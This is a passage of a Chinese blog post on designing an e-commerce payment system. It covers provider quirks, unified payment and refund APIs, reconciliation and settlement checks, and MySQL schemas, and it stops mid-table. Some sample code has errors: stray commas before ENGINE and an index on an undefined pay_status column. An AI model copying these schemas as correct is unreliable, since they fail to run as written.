<h4 id="招商银行"><a href="#招商银行" class="headerlink" title="招商银行"></a>招商银行</h4><p>随着在线支付在国内的蓬勃发展，各家银行也是不断推出自己的在线支付能力。其中的佼佼者当属 <strong>招商银行</strong>。大家经常用的滴滴上面就有该支付方式，可以体验一下。</p>
<p>招商支付使用的是银行卡，因此首次用户必须进行绑卡。因此这里可能就多了一个流程，首先得记录用户是否绑过卡，然后用于签名的公钥会发生变化，需要定期更新。</p>
<p>招商所有平台的支付体验都是一致的，会跳转到招行的H5页面完成逻辑，支付成功后并不会自动跳回商户，也就是没有 <strong>同步通知</strong>，它的支付结果只会走异步通知流程，延迟非常短暂。</p>
<p>退款流程与支付宝一样，也是同步返回退款结果，没有异步通知。</p>
<blockquote>
<p>第二个不同点： 支付前需要检查用户是否签约过，有签约流程</p>
</blockquote>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>国内在线支付流程相对都比较完善，接入起来也非常容易。需要注意的一点是：退款后之前支付的单子依然是支付成功状态，并不会变成退款状态。因为退款与支付属于不同的交易。</p>
<p>这一点基本上是国内在线支付的通用做法。</p>
<h3 id="国际支付"><a href="#国际支付" class="headerlink" title="国际支付"></a>国际支付</h3><p>国际支付的平台非常多，包括像支付宝、微信也在扩展这一块市场。我以我接触的几家支付做一个简单的总结。</p>
<h4 id="WorldPay"><a href="#WorldPay" class="headerlink" title="WorldPay"></a>WorldPay</h4><p>这是比较出名的一家国际支付公司，它主要做的是银行卡支付，公司在英国</p>
<p>支付流程上，也是根据规则构建好请求的url后，直接跳转到 <strong>WorldPay</strong> 的页面，通过信用卡完成支付。这里比较麻烦的处理机制是：支付成功后，他首次给你的异步/同步消息通知并不能作为支付成功的依据。真的从银行确认划款成功后，才会给出真的支付成功通知。这中间还可能会异步通知告诉你支付请求被拒绝。最头痛的是不同状态的异步消息时间间隔都是按照分钟以上级别的延迟来计算</p>
<p>退款流程上，状态跟微信一样，需要通过异步消息来确认退款状态。其次它的不同点在于无法根据商户退款单号来确认是否已经发起过退款，因此对于它来说只要请求一次退款接口，那它就默认发起了一次退款。</p>
<blockquote>
<p>第三不同点： 支付成功后的通知状态有多种，涉及到商户系统业务流程的特殊处理</p>
<p>第四不同点： 退款不支持商户退款单号，无法支持防重复退款需要商户自己处理</p>
</blockquote>
<h4 id="Assist"><a href="#Assist" class="headerlink" title="Assist"></a>Assist</h4><p>这是俄罗斯的一家支付公司，这也是一家搞死人不偿命的公司，看下面介绍</p>
<p>它的支付发起是需要构建一个form表单，向它post支付相关的数据。成功后会跳转到它的支付页，用户完成支付即可。对于 <strong>同步通知</strong>，它需要用户手动触发跳回商户，与招商的逻辑很像，同步也仅仅是做返回并不会真的告知支付结果。<strong>异步通知</strong> 才是真的告知支付状态。比较恶心的是，支付时必须传入指定格式的商品信息，这会在部分退款时用到。</p>
<p>现在来说退款，退款也是与 <strong>WorldPay</strong> 一样，不支持商户的退款单号，因此防重方面也许自己的系统进行设计。并且如果是部分退款，需要传入指定的退款商品，这就会出现一个非常尴尬的局面：部分退款的金额与任何一个商品金额都对应不上，退款则会失败。</p>
<blockquote>
<p>第五个不同点： 部分退款时需要传入部分退款的商品信息，并且金额要一致</p>
</blockquote>
<h4 id="Doku"><a href="#Doku" class="headerlink" title="Doku"></a>Doku</h4><p>接下来再来聊聊印尼的这家支付机构 <strong>doku</strong>。由于印尼这个国家信用卡的普及程度并不高，它的在线支付提供一种超商支付方式。</p>
<p>什么是超商支付呢？也就是用户在网络上完成下单后，会获取到一个二维码或者条形码。用户拿着这个条形码到超商（711、全家这种）通过收银员扫码，付现金给超商，完成支付流程。</p>
<p>这种方式带来的问题是，用户长时间不去支付，导致订单超时关单后才去付款。对整个业务流程以及用户体验带来很多伤害。</p>
<p>再来说退款，由于存在超商这种支付方式，导致这种支付无法支持在线自动退款，需要人工收集用户银行卡信息，然后完成转账操作。非常痛苦不堪。</p>
<blockquote>
<p>第六个不同点： 线上没有付款，只有获取付款码，退款需要通过人工操作</p>
</blockquote>
<h4 id="AmazonPay"><a href="#AmazonPay" class="headerlink" title="AmazonPay"></a>AmazonPay</h4><p>亚马逊出品，与支付宝非常类似。提供的是集成式的钱包流程。</p>
<p>支付时直接构建一个url，然后跳转到亚马逊即可完成支付。它还提供一种授权模式，能够不用跳转amazon，再商户端即完成支付。</p>
<p>支付成功后也会同步跳转，<strong>同步通知</strong> 的内容可以作为支付是否成功的判断依据。经过实际检查 <strong>异步通知</strong> 的到达会稍有延迟，大概10s以内。</p>
<p>退款方面也支持商户退款单号可以依赖此进行防重。但是退款的状态也是基于异步来的。</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>这其中还有一些国际支付，如：<strong>PayPal</strong>、<strong>GooglePay</strong>、<strong>PayTM</strong> 等知名支付机构没有进行介绍，是因为基本它们的流程也都在上面的模式之中。我们后续的代码结构设计、数据库设计都基于满足上面的各种支付模型来完成设计。</p>
<p>最后，赠送大家一副脑图，这是接入一家支付时必须弄清楚的问题清单</p>
<p><img src="/articles/电商设计手册/pay-2.png" alt="pay-2"></p>
<h2 id="支付系统设计"><a href="#支付系统设计" class="headerlink" title="支付系统设计"></a>支付系统设计</h2><p>文中我们从严谨的角度一步步聊到支付如何演变成独立的系统。内容包括：系统演进过程、接口设计、数据库设计以及代码如何组织的示例。若有不足之处，欢迎讨论共同学习。</p>
<h3 id="从模块到服务"><a href="#从模块到服务" class="headerlink" title="从模块到服务"></a>从模块到服务</h3><p>我记得最开始工作的时候，所有的功能：加购物车/下单/支付 等逻辑都是放在一个项目里。如果一个新的项目需要某个功能，就把这个部分的功能包拷贝到新的项目。数据库也原封不动的拷贝过来，稍微根据需求改改。</p>
<p>这就是所谓的 <strong>单体应用</strong> 时代，随着公司产品线开始多元，每条产品线都需要用到支付服务。如果支付模块调整了代码，那么就会处处改动、处处测试。另一方面公司的交易数据割裂在不同的系统中，无法有效汇总统一分析、管理。</p>
<p>这时就到了系统演进的时候，我们把每个产品线的支付模块抽离成统一的服务。对自己公司内部提供统一的API使用，可以对这些API进一步包装成对应的SDK，供内部业务线快速接入。这里服务使用HTTP或者是RPC协议都可以根据公司实际情况决定。不过如果考虑到未来给第三方使用，建议使用HTTP协议，</p>
<p><strong>系统的演变过程：</strong></p>
<p><img src="/articles/电商设计手册/image-20190309104541749.png" alt></p>
<p>总结下，将支付单独抽离成服务后，带来好处如下：</p>
<ol>
<li>避免重复开发，数据隔离的现象出现；</li>
<li>支付系统周边功能演进更容易，整个系统更完善丰满。如：对账系统、实时交易数据展示；</li>
<li>随时可对外开发，对外输出Paas能力，成为有收入的项目；</li>
<li>专门的团队进行维护，系统更有机会演进成顶级系统；</li>
<li>公司重要账号信息保存一处，风险更小。</li>
</ol>
<h3 id="系统能力"><a href="#系统能力" class="headerlink" title="系统能力"></a>系统能力</h3><p>如果我们接手该需求，需要为公司从零搭建支付系统。我们该从哪些方面入手？这样的系统到底需要具备什么样的能力呢？</p>
<p>首先支付系统我们可以理解成是一个适配器。他需要把很多第三方的接口进行统一的整合封装后，对内部提供统一的接口，减少内部接入的成本。做为一个最基本的支付系统。需要对内提供如下接口出来：</p>
<ol>
<li>发起支付，我们取名：<code>/gopay</code></li>
<li>发起退款，我们取名：<code>/refund</code></li>
<li>接口异步通知，我们取名：<code>/notify/支付渠道/商户交易号</code></li>
<li>接口同步通知，我们取名：<code>/return/支付渠道/商户交易号</code></li>
<li>交易查询，我们取名：<code>/query/trade</code></li>
<li>退款查询，我们取名：<code>/query/refund</code></li>
<li>账单获取，我们取名：<code>/query/bill</code></li>
<li>结算明细，我们取名：<code>/query/settle</code></li>
</ol>
<p>一个基础的支付系统，上面8个接口是肯定需要提供的（这里忽略某些支付中的转账、绑卡等接口）。现在我们来基于这些接口看看都有哪些系统会用到。</p>
<p><img src="/articles/电商设计手册/image-20190309111001880.png" alt></p>
<p>下面按照系统维度，介绍下这些接口如何使用，以及内部的一些逻辑。</p>
<h4 id="应用系统"><a href="#应用系统" class="headerlink" title="应用系统"></a>应用系统</h4><p>一般支付网关会提供两种方式让应用系统接入：</p>
<ol>
<li>网关模式，也就是应用系统自己需要开发一个收银台；（适合提供给第三方）</li>
<li>收银台模式，应用系统直接打开支付网关的统一收银台。（内部业务）</li>
</ol>
<p>下面为了讲清楚设计思路，我们按照 <strong>网关模式</strong> 进行讲解。</p>
<p>对于应用系统它需要能够请求支付，也就是调用 <code>gopay</code> 接口。这个接口会处理商户的数据，完成后会调用第三方网关接口，并将返回结果统一处理后返回给应用方。</p>
<p>这里需要注意，第三方针对支付接口根据我的经验大致有以下情况：</p>
<ol>
<li>支付时，不需要调用第三方，按照规则生成数据即可；</li>
<li>支付时，需要调用第三方多个接口完成逻辑（这可能比较慢，大型活动时需要考虑限流/降配）；</li>
<li>返回的数据是一个url，可直接跳转到第三方完成支付（wap/pc站）；</li>
<li>返回的数据是xml/json结构，需要拼装或作为参数传给她的sdk（app）。</li>
</ol>
<p>这里由于第三方返回结构的不统一，我们需要统一处理成统一格式，返回给商户端。我推荐使用json格式。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errno"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>:<span class="string">"ok"</span>,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们把所有的变化封装在 <strong>data</strong> 结构中。举个例子，如果返回的一个url。只需要应用程序发起 <strong>GET</strong> 请求。我们可以这样返回：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errno"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>:<span class="string">"ok"</span>,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line">        <span class="attr">"url"</span>:<span class="string">"xxxxx"</span>,</span><br><span class="line">        <span class="attr">"method"</span>:<span class="string">"GET"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是返回的结构，需要应用程序直接发起 <strong>POST</strong> 请求。我们可以这样返回：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errno"</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="attr">"msg"</span>:<span class="string">"ok"</span>,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line">        <span class="attr">"from"</span>:<span class="string">"&lt;form action="</span>xxx<span class="string">" method="</span>POST<span class="string">"&gt;xxxxx&lt;/form&gt;"</span>,</span><br><span class="line">        <span class="attr">"method"</span>:<span class="string">"POST"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的 <strong>form</strong> 字段，生成了一个form表单，应用程序拿到后可直接显示然后自动提交。当然封装成 from表单这一步也可以放在商户端进行。</p>
<p>上面的数据格式仅仅是一个参考。大家可根据自己的需求进行调整。</p>
<p>一般应用系统除了会调用发起支付的接口外，可能还需要调用 <strong>支付结果查询接口</strong>。当然大多数情况下不需要调用，应用系统对交易的状态只应该依赖自己的系统状态。</p>
<h4 id="对账系统"><a href="#对账系统" class="headerlink" title="对账系统"></a>对账系统</h4><p>对于对账，一般分为两个类型：<strong>交易对账</strong> 与 <strong>结算对账</strong></p>
<p><strong>交易对账</strong></p>
<p>交易对账的核心点是：<strong>检查每一笔交易是否正确</strong>。它主要目的是看我们系统中的每一笔交易与第三方的每一笔交易是否一致。</p>
<p>这个检查逻辑很简单，对两份账单数据进行比较。它主要是使用 <code>/query/bill</code> 接口，拿到在第三方那边完成的交易数据。然后跟我方的交易成功数据进行比较。检查是否存在误差。</p>
<p>这个逻辑非常简单，但是有几点需要大家注意：</p>
<ol>
<li>我方的数据需要正常支付数据+重复支付数据的总和；</li>
<li>对账检查不成功主要包括：<strong>金额不对</strong>、<strong>第三方没有找到对应的交易数据</strong>、<strong>我方不存在对应的交易数据</strong>。</li>
</ol>
<p>针对这些情况都需要有对应的处理手段进行处理。在我的经验中上面的情况都有过遇到。</p>
<p><strong>金额不对</strong>：主要是由于第三方的问题，可能是系统升级故障、可能是账单接口金额错误；</p>
<p><strong>第三方无交易数据：</strong> 可能是拉去的账单时间维度问题（比如存在时差），这种时区问题需要自己跟第三方确认找到对应的时间差。也可能是被攻击，有人冒充第三方异步通知（说明系统校验机制又问题或者密钥泄漏了）。</p>
<p><strong>自己系统无交易数据：</strong> 这种原因可能是第三方通知未发出或者未正确处理导致的。</p>
<p>上面这些问题的处理绝大部份都可以依赖 <code>query/trade</code>  <code>query/refund</code> 来完成自动化处理。</p>
<p><strong>结算对账</strong></p>
<p>那么有了上面的 <strong>交易对账</strong> 为什么还需要 <strong>结算对账</strong> 呢？这个系统又是干嘛的？先来看下结算的含义。</p>
<blockquote>
<p>结算，就是第三方网关在固定时间点，将T+x或其它约定时间的金额，汇款到公司账号。</p>
</blockquote>
<p>下面我们假设结算周期是： <strong>T+1</strong>。结算对账主要使用到的接口是 <code>/query/settle</code>，这个接口获取的主要内容是：每一笔结算的款项都是由哪些笔交易组成（交易成功与退款数据）。以及本次结算扣除多少手续费用。</p>
<p>它的逻辑其实也很简单。我们先从自己的系统按照 <strong>T+1</strong> 的结算周期，计算出对方应该汇款给我们多少金额。然后与刚刚接口获取到的数据金额比较：</p>
<blockquote>
<p>银行收款金额 + 手续费 = 我方系统计算的金额</p>
</blockquote>
<p>这一步检查通过后，说明金额没有问题。接下来需要检查本次结算下的每一笔订单是否一致。</p>
<p>结算系统是 <strong>强依赖</strong> 对账系统的。如果对账发现异常，那么结算金额肯定会出现异常。另外结算需要注意的一些问题是：</p>
<ul>
<li>银行可能会自行退款给用户，因为用户可直接向自己发卡行申请退款；</li>
<li>结算也存在时区差问题；</li>
<li>结算接口中的明细交易状态与我方并不完全一致。比如：银行结算时发现某笔退款完成，但我方系统在进行比较时按照未退款完成的逻辑在处理。</li>
</ul>
<p>针对上面的问题，大家根据自己的业务需求需要做一些方案来进行自动化处理。</p>
<h4 id="财务系统"><a href="#财务系统" class="headerlink" title="财务系统"></a>财务系统</h4><p>财务系统有很多内部业务，我这里只聊与支付系统相关的。（当然上面的对账系统也可以算是财务范畴）。</p>
<p>财务系统与支付主要的一个关系点在于校验交易、以及退款。这里校验交易可以使用 <code>query/trade</code>  <code>query/refund</code>这两个接口来完成。这个逻辑过程就不需要说了。下面重点说下退款。</p>
<p>我看到很多的系统退款是直接放在了应用里边，用户申请退款直接就调用退款接口进行退款。这样的风险非常高。支付系统的关于资金流向的接口一定要慎重，不能过多的直接暴露给外部，带来风险。</p>
<p>退款的功能应该是放到财务系统来做。这样可以走内部的审批流程（是否需要根据业务来），并且在财务系统中可以进行更多检查来觉得是否立即进行退款，或者进入等待、拒绝等流程。</p>
<h4 id="第三方网关"><a href="#第三方网关" class="headerlink" title="第三方网关"></a>第三方网关</h4><p>针对第三方主要使用到的其实就是异步通知与同步通知两个接口。这一部分的逻辑其实非常简单。就是根据第三方的通知完成交易状态的变更。以及通知到自己对应的应用系统。</p>
<p>这部分比较复杂的是，第三方的通知数据结构不统一、通知的类型不统一。比如：有的退款是同步返回结果、有的是异步返回结果。这里如何设计会在后面的 <strong>系统设计</strong> 中给出答案。</p>
<h3 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h3><p>数据的设计是按照：交易、退款、日志 来设计的。对于上面说到的对账等功能并没有。这部分不难大家可以自行设计，按照上面讲到的思路。主要的表介绍如下：</p>
<ul>
<li><code>pay_transaction</code> 记录所有的交易数据。</li>
<li><code>pay_transaction_extension</code> 记录每次向第三方发起交易时，生成的交易号</li>
<li><code>pay_log_data</code> 所有的日志数据，如：支付请求、退款请求、异步通知等</li>
<li><code>pay_repeat_transaction</code> 重复支付的数据</li>
<li><code>pay_notify_app_log</code> 通知应用程序的日志</li>
<li><code>pay_refund</code> 记录所有的退款数据</li>
</ul>
<p><strong>具体的表结构：</strong></p>
<pre><code class="sql"><span class="comment">-- -----------------------------------------------------</span>
<span class="comment">-- Table 创建支付流水表</span>
<span class="comment">-- -----------------------------------------------------</span>
<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_transaction`</span> (
  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,
  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用id'</span>,
  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付方式id，可以用来识别支付，如：支付宝、微信、Paypal等'</span>,
  <span class="string">`app_order_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用方订单号'</span>,
  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'本次交易唯一id，整个支付系统唯一，生成他的原因主要是 order_id对于其它应用来说可能重复'</span>,
  <span class="string">`total_fee`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付金额，整数方式保存'</span>,
  <span class="string">`scale`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'金额对应的小数位数'</span>,
  <span class="string">`currency_code`</span> <span class="built_in">CHAR</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'CNY'</span> <span class="keyword">COMMENT</span> <span class="string">'交易的币种'</span>,
  <span class="string">`pay_channel`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'选择的支付渠道，比如：支付宝中的花呗、信用卡等'</span>,
  <span class="string">`expire_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'订单过期时间'</span>,
  <span class="string">`return_url`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付后跳转url'</span>,
  <span class="string">`notify_url`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付后，异步通知url'</span>,
  <span class="string">`email`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'用户的邮箱'</span>,
  <span class="string">`sing_type`</span> <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'RSA'</span> <span class="keyword">COMMENT</span> <span class="string">'采用的签方式：MD5 RSA RSA2 HASH-MAC等'</span>,
  <span class="string">`intput_charset`</span> <span class="built_in">CHAR</span>(<span class="number">5</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'UTF-8'</span> <span class="keyword">COMMENT</span> <span class="string">'字符集编码方式'</span>,
  <span class="string">`payment_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'第三方支付成功的时间'</span>,
  <span class="string">`notify_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'收到异步通知的时间'</span>,
  <span class="string">`finish_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'通知上游系统的时间'</span>,
  <span class="string">`trade_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方的流水号'</span>,
  <span class="string">`transaction_code`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'真实给第三方的交易code，异步通知的时候更新'</span>,
  <span class="string">`order_status`</span> <span class="built_in">TINYINT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'0:等待支付，1:待付款完成， 2:完成支付，3:该笔交易已关闭，-1:支付失败'</span>,
  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,
  <span class="string">`update_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,
  <span class="string">`create_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建的ip，这可能是自己服务的ip'</span>,
  <span class="string">`update_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'更新的ip'</span>,
  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),
  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> <span class="string">`uniq_tradid`</span> (<span class="string">`transaction_id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_trade_no`</span> (<span class="string">`trade_no`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_ctime`</span> (<span class="string">`create_at`</span>)),
<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span>
<span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4
<span class="keyword">COMMENT</span> = <span class="string">'发起支付的数据'</span>;

<span class="comment">-- -----------------------------------------------------</span>
<span class="comment">-- Table 交易扩展表</span>
<span class="comment">-- -----------------------------------------------------</span>
<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_transaction_extension`</span> (
  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,
  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'系统唯一交易id'</span>,
  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,
  <span class="string">`transaction_code`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'生成传输给第三方的订单号'</span>,
  <span class="string">`call_num`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'发起调用的次数'</span>,
  <span class="string">`extension_data`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'扩展内容，需要保存：transaction_code 与 trade no 的映射关系，异步通知的时候填充'</span>,
  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,
  <span class="string">`create_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'创建ip'</span>,
  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_trads`</span> (<span class="string">`transaction_id`</span>, <span class="string">`pay_status`</span>),
  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> <span class="string">`uniq_code`</span> (<span class="string">`transaction_code`</span>)),
<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span>
<span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4
<span class="keyword">COMMENT</span> = <span class="string">'交易扩展表'</span>;

<span class="comment">-- -----------------------------------------------------</span>
<span class="comment">-- Table 交易系统全部日志</span>
<span class="comment">-- -----------------------------------------------------</span>
<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_log_data`</span> (
  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,
  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用id'</span>,
  <span class="string">`app_order_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用方订单号'</span>,
  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'本次交易唯一id，整个支付系统唯一，生成他的原因主要是 order_id对于其它应用来说可能重复'</span>,
  <span class="string">`request_header`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'请求的header 头'</span>,
  <span class="string">`request_params`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付的请求参数'</span>,
  <span class="string">`log_type`</span> <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'日志类型，payment:支付; refund:退款; notify:异步通知; return:同步通知; query:查询'</span>,
  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,
  <span class="string">`create_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建ip'</span>,
  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_tradt`</span> (<span class="string">`transaction_id`</span>, <span class="string">`log_type`</span>)),
<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span>
<span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4
<span class="keyword">COMMENT</span> = <span class="string">'交易日志表'</span>;


<span class="comment">-- -----------------------------------------------------</span>
<span class="comment">-- Table 重复支付的交易</span>
<span class="comment">-- -----------------------------------------------------</span>
<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_repeat_transaction`</span> (
  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,
